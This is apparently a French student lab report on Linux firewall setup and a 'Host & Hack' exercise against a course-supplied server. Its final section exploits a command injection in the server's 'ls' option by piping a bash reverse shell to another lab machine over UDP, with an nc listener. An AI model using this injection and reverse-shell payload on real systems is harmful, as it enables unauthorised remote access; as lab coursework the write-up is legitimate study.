# linux-10-11

0. Prérequis

🌞 Boom ça commence direct : je veux l'état initial du firewall

```
[hugo@efrei-xmg4agau1 ~]$ systemctl status firewalld
● firewalld.service - firewalld - dynamic firewall daemon
     Loaded: loaded (/usr/lib/systemd/system/firewalld.service; enabled; preset: enabled)
     Active: active (running) since Tue 2024-09-10 04:14:38 EDT; 8min ago
       Docs: man:firewalld(1)
   Main PID: 703 (firewalld)
      Tasks: 2 (limit: 48922)
     Memory: 41.8M
        CPU: 627ms
     CGroup: /system.slice/firewalld.service
             └─703 /usr/bin/python3 -s /usr/sbin/firewalld --nofork --nopid

Sep 10 04:14:37 localhost systemd[1]: Starting firewalld - dynamic firewall daemon...
Sep 10 04:14:38 localhost systemd[1]: Started firewalld - dynamic firewall daemon.
```

```
[hugo@efrei-xmg4agau1 ~]$ sudo firewall-cmd --list-services
[sudo] password for hugo:
cockpit dhcpv6-client ssh
```

```
[hugo@efrei-xmg4agau1 ~]$ sudo firewall-cmd --permanent --remove-service=cockpit
success
[hugo@efrei-xmg4agau1 ~]$ sudo firewall-cmd --permanent --remove-service=dhcpv6-client
success
[hugo@efrei-xmg4agau1 ~]$ sudo firewall-cmd --reload
success
[hugo@efrei-xmg4agau1 ~]$ sudo firewall-cmd --list-services
ssh
```

🌞 Fichiers /etc/sudoers /etc/passwd /etc/group dans le dépôt de compte-rendu svp !

/etc/sudoers
```
## Allows people in group wheel to run all commands
%wheel  ALL=(ALL)       ALL
```
/etc/passwd
```
hugo:x:1000:1000:hugo:/home/hugo:/bin/bash
```
/etc/group
```
wheel:x:10:hugo
```

I. Partie 1 : Host & Hack

🌞 Télécharger l'application depuis votre VM
```
[hugo@efrei-xmg4agau1 ~]$ curl -O https://gitlab.com/it4lik/b3-csec-2024/-/raw/main/efrei_server
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 7044k  100 7044k    0     0  8718k      0 --:--:-- --:--:-- --:--:-- 8707k
```

```
[hugo@efrei-xmg4agau1 ~]$ ls
efrei_server
[hugo@efrei-xmg4agau1 ~]$ chmod +x efrei_server
```

🌞 Lancer l'application efrei_server

```
[hugo@efrei-xmg4agau1 ~]$ LISTEN_ADDRESS=192.168.56.101 ./efrei_server
Warning: You should consider setting the environment variable LOG_DIR. Defaults to /tmp.
Server started. Listening on ('192.168.56.101', 8888)...
```
🌞 Prouvez que l'application écoute sur l'IP que vous avez spécifiée
```
[hugo@efrei-xmg4agau1 ~]$ ss -tuln | grep 8888
tcp   LISTEN 0      100    192.168.56.114:8888      0.0.0.0:*
```
2. Prêts
   
🌞 Se connecter à l'application depuis votre PC

```
hugo@efrei-xmg4agau1 ~$ nc 192.168.56.114 8888
Hello ! Tu veux des infos sur quoi ?
1) cpu
2) ram
3) disk
4) ls un dossier

Ton choix (1, 2, 3 ou 4) :
```

3. Hackez

🌞 Euh bah... hackez l'application !

Du côté client, on constate qu'en sélectionnant l'option 4, il est possible de choisir un dossier à lister avec la commande ls, puis d'injecter une commande via un pipe. Ainsi, nous injectons un reverse shell en bash et configurons un serveur d'écoute sur une autre machine

```
   Ton choix (1, 2, 3 ou 4) : 4
Exécuter la commande ls vers le dossier : /etc | sh -i >& /dev/udp/192.168.56.115/4242 0>&1
```
```
nc -u -lvp -4242
```






























